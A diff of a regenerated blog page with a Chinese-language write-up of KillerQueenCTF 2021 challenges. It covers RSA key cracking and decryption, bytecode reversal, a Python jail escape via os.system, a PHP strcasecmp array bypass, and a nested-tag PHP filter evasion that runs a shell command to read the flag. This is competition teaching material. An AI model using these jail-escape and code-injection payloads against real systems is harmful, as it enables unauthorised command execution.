@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 3.9.0">
+<meta name="generator" content="Hexo 6.3.0">
 <script data-ad-client="ca-pub-6912066943609875" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
   <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
@@ -54,17 +54,18 @@
 </script>
 
   <meta name="description" content="KillerQueenCTF2021 Writeup">
-<meta name="keywords" content="CTF,KillerQueenCTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="KillerQueenCTF2021 Writeup">
 <meta property="og:url" content="https://zhaoqi.vip/posts/2621990551/index.html">
 <meta property="og:site_name" content="温柔小猪">
 <meta property="og:description" content="KillerQueenCTF2021 Writeup">
-<meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2023-07-24T03:06:57.503Z">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-11-02T07:04:27.000Z">
+<meta property="article:modified_time" content="2023-08-07T18:06:54.279Z">
+<meta property="article:author" content="Zhao Qi">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="KillerQueenCTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="KillerQueenCTF2021 Writeup">
-<meta name="twitter:description" content="KillerQueenCTF2021 Writeup">
 
 <link rel="canonical" href="https://zhaoqi.vip/posts/2621990551/">
 
@@ -128,6 +129,8 @@
 </noscript>
 
   
+<link rel="alternate" href="/atom.xml" title="温柔小猪" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="温柔小猪" type="application/rss+xml">
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -307,14 +310,14 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>8.6k</span>
+              <span>8.9k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="fa fa-clock-o"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>14 分钟</span>
+              <span>15 分钟</span>
             </span>
             <div class="post-description">KillerQueenCTF2021 Writeup</div>
 
@@ -329,7 +332,7 @@
       
         <h1 id="Cloudsourcing"><a href="#Cloudsourcing" class="headerlink" title="Cloudsourcing"></a>Cloudsourcing</h1><p><em>Sourced in the cloud</em></p>
 <hr>
-<p>使用<a href="https://github.com/Ganapati/RsaCtfTool" target="_blank" rel="noopener">RsaCtfTool</a>破解公钥,将得到的私钥保存至<code>a.pem</code></p>
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool</a>破解公钥,将得到的私钥保存至<code>a.pem</code></p>
 <pre><code class="shell">~$ python RsaCtfTool.py --publickey cloudsourcing/key.pub --private
 -----BEGIN RSA PRIVATE KEY-----
 MIIEowIBAAKCAQEAzTf73VQrgsjh5aRpcE1waspEO5B48ZgjIfZyloCzR5cC2Rc1
@@ -360,57 +363,57 @@ SpUX47+QBmx6Q8mHa97x/sGidZMlOEBG38bhvfdMgX0pW8zO+Oll
 -----END RSA PRIVATE KEY-----
 </code></pre>
 <p>编写代码,用RSA解密</p>
-<pre><code class="python"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA
-<span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5 <span class="keyword">as</span> PKCS1_cipher
-<span class="keyword">import</span> base64
-c = <span class="string">'Oz5cG3uh6HGoPTsM9yERR2senJ+flkD9dikgzIDimT7xvguYEHGCMvYiD5F5dwbDIlvM7SqYxbzsx5L7+Kfg5OkvrJOMdc7tEsQK7L4n4QSN2mhxVP0AjxpHgufob+MfvL7/36grb6taeW8l5uLUveZ3aPK/XJt35znPScCxTLShFGj0xc/aCxRZYV+oNT6ygyPV4RSGh8v/yeY9bY1wIjYfQLqufKeogcsdBtBXTYQGCX+JQo9NVBLNkU7zQLT+AKit68HkTsORXhjNBFqvj4hQs3jB4rfUt54MKoDDuK0BFrfACKJIQe2LpmBtrVznlyfygIBfmFwrdkHRDi9bdA=='</span>
+<pre><code class="python">from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_v1_5 as PKCS1_cipher
+import base64
+c = &#39;Oz5cG3uh6HGoPTsM9yERR2senJ+flkD9dikgzIDimT7xvguYEHGCMvYiD5F5dwbDIlvM7SqYxbzsx5L7+Kfg5OkvrJOMdc7tEsQK7L4n4QSN2mhxVP0AjxpHgufob+MfvL7/36grb6taeW8l5uLUveZ3aPK/XJt35znPScCxTLShFGj0xc/aCxRZYV+oNT6ygyPV4RSGh8v/yeY9bY1wIjYfQLqufKeogcsdBtBXTYQGCX+JQo9NVBLNkU7zQLT+AKit68HkTsORXhjNBFqvj4hQs3jB4rfUt54MKoDDuK0BFrfACKJIQe2LpmBtrVznlyfygIBfmFwrdkHRDi9bdA==&#39;
 
-<span class="keyword">with</span> open(<span class="string">'a.pem'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:
+with open(&#39;a.pem&#39;,&#39;r&#39;) as f:
     pri_key = RSA.importKey(f.read())
     cipher = PKCS1_cipher.new(pri_key)
-    plain = cipher.decrypt(base64.b64decode(c), <span class="number">0</span>)
+    plain = cipher.decrypt(base64.b64decode(c), 0)
     print(plain)
 </code></pre>
-<p><strong>flag:</strong><code>kqctf{y0uv3_6r4du473d_fr0m_r54_m1ddl3_5ch00l_abe7e79e244a9686efc0}</code></p>
+<p><strong>flag:</strong><code>kqctf&#123;y0uv3_6r4du473d_fr0m_r54_m1ddl3_5ch00l_abe7e79e244a9686efc0&#125;</code></p>
 <h1 id="Road-Safety-Association"><a href="#Road-Safety-Association" class="headerlink" title="Road_Safety_Association"></a>Road_Safety_Association</h1><p><em>That’s what it stands for, right?</em></p>
 <hr>
 <p>题目给了c,p,q,e的值,直接求d解密即可<br>代码:</p>
-<pre><code class="python"><span class="keyword">import</span> gmpy2
-<span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes
+<pre><code class="python">import gmpy2
+from Crypto.Util.number import long_to_bytes
 
-c = <span class="number">34709089913401150635163820358938916881993556790698827096314474131695180194656373592831158701400832173951061153349955626770351918715134102729180082310540500929299260384727841272328651482716425284903562937949838801126975821205390573428889205747236795476232421245684253455346750459684786949905537837807616524618</span>
-p = <span class="number">7049378199874518503065880299491083072359644394572493724131509322075604915964637314839516681795279921095822776593514545854149110798068329888153907702700969</span>
-q = <span class="number">11332855855499101423426736341398808093169269495239972781080892932533129603046914334311158344125602053367004567763440106361963142912346338848213535638676857</span>
-e = <span class="number">65537</span>
+c = 34709089913401150635163820358938916881993556790698827096314474131695180194656373592831158701400832173951061153349955626770351918715134102729180082310540500929299260384727841272328651482716425284903562937949838801126975821205390573428889205747236795476232421245684253455346750459684786949905537837807616524618
+p = 7049378199874518503065880299491083072359644394572493724131509322075604915964637314839516681795279921095822776593514545854149110798068329888153907702700969
+q = 11332855855499101423426736341398808093169269495239972781080892932533129603046914334311158344125602053367004567763440106361963142912346338848213535638676857
+e = 65537
 
 n = p * q
-phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)
+phi = (p-1) * (q-1)
 d = gmpy2.invert(e, phi)
 x = pow(c, d, n)
 print(x)
 print(long_to_bytes(x))
 </code></pre>
-<p><strong>flag:</strong><code>kqctf{y0uv3_6r4du473d_fr0m_r54_3l3m3n74ry_5ch00l_ac8770bdcebc}</code></p>
+<p><strong>flag:</strong><code>kqctf&#123;y0uv3_6r4du473d_fr0m_r54_3l3m3n74ry_5ch00l_ac8770bdcebc&#125;</code></p>
 <h1 id="Hammer-To-Fall"><a href="#Hammer-To-Fall" class="headerlink" title="Hammer To Fall"></a>Hammer To Fall</h1><p><em>Dynamically sized integers huh (wrap the proper input in a flag wrapper kqctf{number})</em></p>
 <hr>
 <p>源文件:</p>
-<pre><code class="python"><span class="keyword">import</span> numpy <span class="keyword">as</span> np
+<pre><code class="python">import numpy as np
 
-a = np.array([<span class="number">0</span>], dtype=int)
-val = int(input(<span class="string">"This hammer hits so hard it creates negative matter\n"</span>))
-<span class="keyword">if</span> val == <span class="number">-1</span>:
+a = np.array([0], dtype=int)
+val = int(input(&quot;This hammer hits so hard it creates negative matter\n&quot;))
+if val == -1:
     exit()
-a[<span class="number">0</span>] = val
-a[<span class="number">0</span>] = (a[<span class="number">0</span>] * <span class="number">7</span>) + <span class="number">1</span>
-print(a[<span class="number">0</span>])
-<span class="keyword">if</span> a[<span class="number">0</span>] == <span class="number">-1</span>:
-    print(<span class="string">"flag!"</span>)
+a[0] = val
+a[0] = (a[0] * 7) + 1
+print(a[0])
+if a[0] == -1:
+    print(&quot;flag!&quot;)
 </code></pre>
-<p><code>NumPy</code>中的int使用的是C中的long,参照<a href="https://numpy.org/doc/stable/reference/arrays.scalars.html#numpy.int_" target="_blank" rel="noopener">NumPy文档</a>,最大值为9223372036854775807</p>
-<pre><code class="python"><span class="meta">&gt;&gt;&gt; </span><span class="number">9223372036854775807</span> // <span class="number">7</span> * <span class="number">2</span>
-<span class="number">2635249153387078802</span>
+<p><code>NumPy</code>中的int使用的是C中的long,参照<a target="_blank" rel="noopener" href="https://numpy.org/doc/stable/reference/arrays.scalars.html#numpy.int_">NumPy文档</a>,最大值为9223372036854775807</p>
+<pre><code class="python">&gt;&gt;&gt; 9223372036854775807 // 7 * 2
+2635249153387078802
 </code></pre>
-<p><strong>flag:</strong><code>kqctf{2635249153387078802}</code></p>
+<p><strong>flag:</strong><code>kqctf&#123;2635249153387078802&#125;</code></p>
 <h1 id="I-want-to-break-free"><a href="#I-want-to-break-free" class="headerlink" title="I want to break free"></a>I want to break free</h1><p><em>I want to break free… from this Python jail. nc 143.198.184.186 45457</em></p>
 <hr>
 <p>使用<code>&#39;o&#39;+&#39;s&#39;</code>绕过对os的过滤,执行ls命令,发现存在文件<code>cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt</code></p>
@@ -418,7 +421,7 @@ print(a[<span class="number">0</span>])
 
     You are in jail. Can you escape?
 
-<span class="meta">&gt;</span><span class="bash"> __builtins__.__import__(<span class="string">'o'</span>+<span class="string">'s'</span>).system(<span class="string">'ls'</span>)</span>
+&gt; __builtins__.__import__(&#39;o&#39;+&#39;s&#39;).system(&#39;ls&#39;)
 bin
 blacklist.txt
 boot
@@ -446,92 +449,92 @@ var
 None
 </code></pre>
 <p>读取文件内容</p>
-<pre><code class="shell"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">print</span>(__builtins__.open(<span class="string">'cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt'</span>).<span class="built_in">read</span>())</span>
-kqctf{0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc}
+<pre><code class="shell">&gt; print(__builtins__.open(&#39;cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt&#39;).read())
+kqctf&#123;0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc&#125;
 
 None
 </code></pre>
-<p><strong>flag:</strong><code>kqctf{0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc}</code></p>
+<p><strong>flag:</strong><code>kqctf&#123;0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc&#125;</code></p>
 <h1 id="sneeki-snek"><a href="#sneeki-snek" class="headerlink" title="sneeki snek"></a>sneeki snek</h1><p><em>ssssssssssssssssssssssssssssssssssssss</em></p>
 <hr>
 <p>根据字节码还原文件:</p>
-<pre><code class="python">f = <span class="string">''</span>
-a = <span class="string">'rwhxi}eomr\\^`Y'</span>
-z = <span class="string">'f]XdThbQd^TYL&amp;\x13g'</span>
+<pre><code class="python">f = &#39;&#39;
+a = &#39;rwhxi&#125;eomr\\^`Y&#39;
+z = &#39;f]XdThbQd^TYL&amp;\x13g&#39;
 a = a + z
-<span class="keyword">for</span> i,b <span class="keyword">in</span> enumerate(a):
+for i,b in enumerate(a):
     c = ord(b)
-    c = c - <span class="number">7</span>
+    c = c - 7
     c = c+i
     f += chr(c)
 
 print(f)
 </code></pre>
-<p><strong>flag:</strong><code>kqctf{dont_be_mean_to_snek_:(}</code></p>
+<p><strong>flag:</strong><code>kqctf&#123;dont_be_mean_to_snek_:(&#125;</code></p>
 <h1 id="sneeki-snek-2-oh-no-what-did-i-do"><a href="#sneeki-snek-2-oh-no-what-did-i-do" class="headerlink" title="sneeki snek 2 oh no what did i do"></a>sneeki snek 2 oh no what did i do</h1><p><em>did snek steal your pasta because this is some spaghetti</em></p>
 <hr>
 <p>根据字节码还原文件:</p>
 <pre><code class="python">a = list()
-a.append(<span class="number">1739411</span>)
-a.append(<span class="number">1762811</span>)
-a.append(<span class="number">1794011</span>)
-a.append(<span class="number">1039911</span>)
-a.append(<span class="number">1061211</span>)
-a.append(<span class="number">1718321</span>)
-a.append(<span class="number">1773911</span>)
-a.append(<span class="number">1006611</span>)
-a.append(<span class="number">1516111</span>)
-a.append(<span class="number">1739411</span>)
-a.append(<span class="number">1582801</span>)
-a.append(<span class="number">1506121</span>)
-a.append(<span class="number">1783901</span>)
-a.append(<span class="number">1783901</span>)
-a.append(<span class="number">1773911</span>)
-a.append(<span class="number">1582801</span>)
-a.append(<span class="number">1006611</span>)
-a.append(<span class="number">1561711</span>)
-a.append(<span class="number">1039911</span>)
-a.append(<span class="number">1582801</span>)
-a.append(<span class="number">1773911</span>)
-a.append(<span class="number">1561711</span>)
-a.append(<span class="number">1582801</span>)
-a.append(<span class="number">1773911</span>)
-a.append(<span class="number">1006611</span>)
-a.append(<span class="number">1516111</span>)
-a.append(<span class="number">1516111</span>)
-a.append(<span class="number">1739411</span>)
-a.append(<span class="number">1728311</span>)
-a.append(<span class="number">1539421</span>)
+a.append(1739411)
+a.append(1762811)
+a.append(1794011)
+a.append(1039911)
+a.append(1061211)
+a.append(1718321)
+a.append(1773911)
+a.append(1006611)
+a.append(1516111)
+a.append(1739411)
+a.append(1582801)
+a.append(1506121)
+a.append(1783901)
+a.append(1783901)
+a.append(1773911)
+a.append(1582801)
+a.append(1006611)
+a.append(1561711)
+a.append(1039911)
+a.append(1582801)
+a.append(1773911)
+a.append(1561711)
+a.append(1582801)
+a.append(1773911)
+a.append(1006611)
+a.append(1516111)
+a.append(1516111)
+a.append(1739411)
+a.append(1728311)
+a.append(1539421)
 
-b = <span class="string">''</span>
-<span class="keyword">for</span> i <span class="keyword">in</span> a:
+b = &#39;&#39;
+for i in a:
     c = str(i)
-    c=c[::<span class="number">-1</span>]
-    c= c[:<span class="number">-1</span>]
+    c=c[::-1]
+    c= c[:-1]
     c = int(c)
-    c = <span class="number">5</span> ^ c
-    c= c - <span class="number">55555</span>
-    c = c // <span class="number">555</span>
+    c = 5 ^ c
+    c= c - 55555
+    c = c // 555
     b = b + chr(c)
 print(b)
 </code></pre>
-<p><strong>flag:</strong><code>kqctf{snek_waas_not_so_sneeki}</code></p>
-<h1 id="Just-Not-My-Type"><a href="#Just-Not-My-Type" class="headerlink" title="Just Not My Type"></a>Just Not My Type</h1><p><em>I really don’t think we’re compatible (<a href="http://143.198.184.186:7000/" target="_blank" rel="noopener">Link</a>)</em></p>
+<p><strong>flag:</strong><code>kqctf&#123;snek_waas_not_so_sneeki&#125;</code></p>
+<h1 id="Just-Not-My-Type"><a href="#Just-Not-My-Type" class="headerlink" title="Just Not My Type"></a>Just Not My Type</h1><p><em>I really don’t think we’re compatible (<a target="_blank" rel="noopener" href="http://143.198.184.186:7000/">Link</a>)</em></p>
 <hr>
 <p>源文件:</p>
-<pre><code class="php+HTML">&lt;h1&gt;I just don&apos;t think we&apos;re compatible&lt;/h1&gt;
+<pre><code class="php+HTML">&lt;h1&gt;I just don&#39;t think we&#39;re compatible&lt;/h1&gt;
 &lt;?php
-$FLAG = &quot;shhhh you don&apos;t get to see this locally&quot;;
-if ($_SERVER[&apos;REQUEST_METHOD&apos;] === &apos;POST&apos;) 
-{
+$FLAG = &quot;shhhh you don&#39;t get to see this locally&quot;;
+if ($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;POST&#39;) 
+&#123;
     $password = $_POST[&quot;password&quot;];
-    if (strcasecmp($password, $FLAG) == 0) {
+    if (strcasecmp($password, $FLAG) == 0) &#123;
         echo $FLAG;
-    } 
-    else {
-        echo &quot;That&apos;s the wrong password!&quot;;
-    }
-}
+    &#125; 
+    else &#123;
+        echo &quot;That&#39;s the wrong password!&quot;;
+    &#125;
+&#125;
 ?&gt;
 &lt;form method=&quot;POST&quot;&gt;
     Password
@@ -542,23 +545,23 @@ if ($_SERVER[&apos;REQUEST_METHOD&apos;] === &apos;POST&apos;)
 <p><strong>Payload</strong></p>
 <pre><code class="php+HTML">password[]=123
 </code></pre>
-<p><strong>flag:</strong><code>flag{no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible}</code></p>
+<p><strong>flag:</strong><code>flag&#123;no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible&#125;</code></p>
 <h1 id="PHat-Pottomed-Girls"><a href="#PHat-Pottomed-Girls" class="headerlink" title="PHat Pottomed Girls"></a>PHat Pottomed Girls</h1><p><em>Now it’s attempt number 3 and this time with a Queen reference! (flag is in the root directory)</em></p>
 <hr>
 <p>源文件:</p>
 <pre><code class="php+HTML">&lt;?php
 session_start();
 
-function generateRandomString($length = 15) {
-    $characters = &apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;;
+function generateRandomString($length = 15) &#123;
+    $characters = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;;
     $charactersLength = strlen($characters);
-    $randomString = &apos;&apos;;
-    for ($i = 0; $i &lt; $length; $i++) {
+    $randomString = &#39;&#39;;
+    for ($i = 0; $i &lt; $length; $i++) &#123;
         $randomString .= $characters[rand(0, $charactersLength - 1)];
-    }
+    &#125;
     return $randomString;
-}
-function filter($originalstring) {
+&#125;
+function filter($originalstring) &#123;
     $notetoadd = str_replace(&quot;&lt;?php&quot;, &quot;&quot;, $originalstring);
     $notetoadd = str_replace(&quot;?&gt;&quot;, &quot;&quot;, $notetoadd);
     $notetoadd = str_replace(&quot;&lt;?&quot;, &quot;&quot;, $notetoadd);
@@ -584,12 +587,12 @@ function filter($originalstring) {
     $notetoadd = str_replace(&quot;system&quot;, &quot;&quot;, $notetoadd);
 
     return $notetoadd;
-}
+&#125;
 
-if(isset($_POST[&quot;notewrite&quot;])) {
+if(isset($_POST[&quot;notewrite&quot;])) &#123;
     $newnote = $_POST[&quot;notewrite&quot;];
 
-    //3rd times the charm and I&apos;ve learned my lesson. Now I&apos;ll make sure to filter more than once :)
+    //3rd times the charm and I&#39;ve learned my lesson. Now I&#39;ll make sure to filter more than once :)
     $notetoadd = filter($newnote);
     $notetoadd = filter($notetoadd);
     $notetoadd = filter($notetoadd);
@@ -598,14 +601,14 @@ if(isset($_POST[&quot;notewrite&quot;])) {
     array_push($_SESSION[&quot;notes&quot;], &quot;$filename.php&quot;);
     file_put_contents(&quot;$filename.php&quot;, $notetoadd);
     header(&quot;location:index.php&quot;);
-}
+&#125;
 </code></pre>
 <p><strong>Payload</strong></p>
 <pre><code class="php+HTML">&lt;&lt;&lt;&lt;&lt;&lt;&lt;?php??php??php??php
  echo `sort /fffflaglaglaglag.php`;
 ????&gt;&gt;&gt;&gt;
 </code></pre>
-<p><strong>flag:</strong><code>flag{wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((}</code></p>
+<p><strong>flag:</strong><code>flag&#123;wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((&#125;</code></p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
     </div>
 
@@ -616,19 +619,19 @@ if(isset($_POST[&quot;notewrite&quot;])) {
   <div class="popular-posts-header">相关文章</div>
   <ul class="popular-posts">
     <li class="popular-posts-item">
-      <div class="popular-posts-title"><a href="/posts/851556193/" rel="bookmark">GoogleCTF2023 Writeup</a></div>
+      <div class="popular-posts-title"><a href="/posts/4120451577/" rel="bookmark">BuckeyeCTF2021 Writeup</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="/posts/2879210530/" rel="bookmark">DEADFACECTF Writeup</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="/posts/2302350511/" rel="bookmark">DownUnderCTF2021 Writeup</a></div>
     </li>
     <li class="popular-posts-item">
       <div class="popular-posts-title"><a href="/posts/632988450/" rel="bookmark">GoogleCTF2022 Writeup</a></div>
     </li>
     <li class="popular-posts-item">
-      <div class="popular-posts-title"><a href="/posts/501486646/" rel="bookmark">TFCCTF2021 Writeup</a></div>
-    </li>
-    <li class="popular-posts-item">
-      <div class="popular-posts-title"><a href="/posts/3427623925/" rel="bookmark">K3RN3LCTF2021 Writeup</a></div>
-    </li>
-    <li class="popular-posts-item">
-      <div class="popular-posts-title"><a href="/posts/98571386/" rel="bookmark">L3HCTF2021-个人能力认证 Writeup</a></div>
+      <div class="popular-posts-title"><a href="/posts/851556193/" rel="bookmark">GoogleCTF2023 Writeup</a></div>
     </li>
   </ul>
 
@@ -815,16 +818,16 @@ if(isset($_POST[&quot;notewrite&quot;])) {
 </div>
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
-        <a href="https://github.com/ZhaoQi99" title="GitHub → https://github.com/ZhaoQi99" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+        <a href="https://github.com/ZhaoQi99" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ZhaoQi99" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
       </span>
       <span class="links-of-author-item">
-        <a href="https://www.linkedin.com/in/zhaoqi99" title="Linkedin → https://www.linkedin.com/in/zhaoqi99" rel="noopener" target="_blank"><i class="fa fa-fw fa-linkedin"></i>Linkedin</a>
+        <a href="https://www.linkedin.com/in/zhaoqi99" title="Linkedin → https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;zhaoqi99" rel="noopener" target="_blank"><i class="fa fa-fw fa-linkedin"></i>Linkedin</a>
       </span>
       <span class="links-of-author-item">
         <a href="mailto:zhaoqi99@outlook.com" title="E-Mail → mailto:zhaoqi99@outlook.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
       </span>
       <span class="links-of-author-item">
-        <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=956361916&website=www.oicqzone.com" title="QQ → tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=956361916&website=www.oicqzone.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i>QQ</a>
+        <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=956361916&website=www.oicqzone.com" title="QQ → tencent:&#x2F;&#x2F;AddContact&#x2F;?fromId&#x3D;45&amp;fromSubId&#x3D;1&amp;subcmd&#x3D;all&amp;uin&#x3D;956361916&amp;website&#x3D;www.oicqzone.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i>QQ</a>
       </span>
   </div>
 
@@ -861,13 +864,13 @@ if(isset($_POST[&quot;notewrite&quot;])) {
       <i class="fa fa-area-chart"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">203k</span>
+    <span title="站点总字数">214k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">5:38</span>
+    <span title="站点阅读时长">5:56</span>
 </div>
   <div class="addthis_inline_share_toolbox">
     <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5a73dc9a89a291e2" async="async"></script>
@@ -1011,9 +1014,19 @@ if(isset($_POST[&quot;notewrite&quot;])) {
   <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
   <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
   <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.ui.min.js"></script>
-<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
 <script src="/js/schemes/pisces.js"></script>
-<script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
 
   <script defer src="//cdn.jsdelivr.net/gh/theme-next/theme-next-three@1/three.min.js"></script>
     <script defer src="//cdn.jsdelivr.net/gh/theme-next/theme-next-three@1/three-waves.min.js"></script>
@@ -1035,7 +1048,9 @@ if(isset($_POST[&quot;notewrite&quot;])) {
 
 
 
-  <script src="/js/local-search.js"></script>
+  
+<script src="/js/local-search.js"></script>
+
 
 
 
